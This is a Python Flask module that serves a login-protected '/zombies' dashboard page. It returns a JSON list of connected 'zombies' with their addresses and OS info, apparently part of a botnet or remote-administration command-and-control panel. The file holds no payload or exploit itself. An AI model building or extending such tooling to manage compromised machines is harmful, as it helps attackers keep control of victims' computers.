#!/usr/bin/env python3

'''
this script is for /zombies page
'''

from flask import render_template,redirect,jsonify
from main.web.functions.web_modules import check_login ,replace_user ,replace_dashboard_title

class ZombiesWeb:

    def run(self):
        if not (check_login()):  # check if user is logged in ,returns true if is logged in
            return redirect('/login' ,code=302)

        page = self.read_page()
        page = replace_user(page=page)
        page = page.replace('{to_replace_text}' ,self.add_element())
        page = replace_dashboard_title(page=page, name='Zombies')
        return page

    def read_page(self):
        template = render_template('dashboard.html')
        return template

    def add_element(self):
        html_text = '''
<div class="get_zombies_response">
Loading...
</div>
        '''
        return html_text

def get_zombies_url_func(server_module_var):

    if not (check_login()):
        return redirect('/login', code=302)

    if ((server_module_var is not None) and (server_module_var.connection_status)):
        zombies_addr_and_comm_list = server_module_var.zombies_addresses_and_communicators_list
        temp_list = []  # store data before sending
        for ac in zombies_addr_and_comm_list:
            temp_list.append([ac[0], ac[2]['os_info']])

        return jsonify(temp_list)

    return 'Get Zombies Request Sent'
